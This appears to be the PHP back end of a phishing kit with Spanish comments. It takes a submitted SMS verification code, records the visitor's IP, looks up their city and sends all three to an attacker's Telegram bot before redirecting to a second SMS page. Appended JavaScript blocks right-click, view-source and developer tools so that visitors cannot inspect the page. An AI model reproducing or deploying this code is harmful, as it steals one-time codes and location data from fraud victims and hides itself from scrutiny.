<?php
// Función para obtener la IP real del cliente
function obtenerIpCliente() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // IP compartida
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // IP pasada por un proxy
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]); // La primera IP es la del cliente real
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        // Último recurso: IP directa
        return $_SERVER['REMOTE_ADDR'];
    }
    return 'IP desconocida';
}

// Obtener la IP del cliente
$direccion_ip = obtenerIpCliente();

// Datos del formulario
$fecha = $_POST['cas2'] ?? '';

// Obtener ciudad basada en la dirección IP
$ciudad = '';
if (!empty($direccion_ip)) {
    $ip_api_url = "http://ip-api.com/json/{$direccion_ip}?fields=city";
    $response = @file_get_contents($ip_api_url);
    if ($response !== false) {
        $json = json_decode($response, true);
        $ciudad = $json['city'] ?? '';
    }
}

// Token del bot y chat ID del canal
$botToken = '75939';
$chatId = '-4690'; // Puede ser el nombre o el ID numérico del canal

// Mensaje a enviar con formato específico
$mensaje = "-TK2-:\n";
$mensaje .= "🔑 TOKEN-AMI-SMS-2: <code>$fecha</code>\n";
$mensaje .= "🌐 IP: <code>$direccion_ip</code>\n";
$mensaje .= "🏙 Ciu: <code>$ciudad</code>";

// URL de la API de Telegram para enviar mensajes
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

// Datos a enviar
$data = [
    'chat_id' => $chatId,
    'text' => $mensaje,
    'parse_mode' => 'HTML'
];

// Configurar la petición
$options = [
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query($data)
    ]
];

// Crear un contexto
$context = stream_context_create($options);

// Enviar el mensaje a Telegram
$result = file_get_contents($telegramUrl, false, $context);

// Redireccionar
if ($result !== false) {
    header('Refresh: 2; URL=sms2.php');
    exit;
}
?>
</script>
        </body>

              <script>
                document.addEventListener("contextmenu", function (event) {
                  event.preventDefault();
                });

                document.addEventListener("keydown", function (event) {
                  if (event.ctrlKey && event.key === "u") {
                    event.preventDefault();
                  }
                });

                  ///////// Código de seguridad
                function blockDevTools() {
                    var devtools = false;
                    var threshold = 160;
                    var checkDevTools = function() {
                        var start = new Date();
                        debugger;
                        var end = new Date();
                        if (end - start > threshold) {
                            devtools = true;
                            document.body.innerHTML = "¡Inspección bloqueada!";
                        } else {
                            devtools = false;
                        }
                    };
                    setInterval(checkDevTools, 1000); // 1e3 = 1000 ms = 1 segundo
                }

                // Prevenir clic derecho e inspección
                function preventInspection() {
                    document.addEventListener("contextmenu", function(event) {
                        event.preventDefault();
                    });

                    document.addEventListener("keydown", function(event) {
                        // Bloquear F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+U
                        if (event.keyCode === 123 || // F12
                            (event.ctrlKey && event.shiftKey && (event.keyCode === 73 || event.keyCode === 67)) || // Ctrl+Shift+I, Ctrl+Shift+C
                            (event.ctrlKey && event.keyCode === 85)) { // Ctrl+U
                            event.preventDefault();
                        }
                    });
                }

                // Inicializar los eventos cuando cargue la página
                window.onload = function() {
                    preventInspection();
                    blockDevTools();
                    startTimer();
                };
            </script>

             </script>
               <script>
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                });

                document.addEventListener('keydown', function(e) {
                    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
                        e.preventDefault();
                    }
                });
            </script>



            </body></html>

        </html>

</form>
</body>
</html>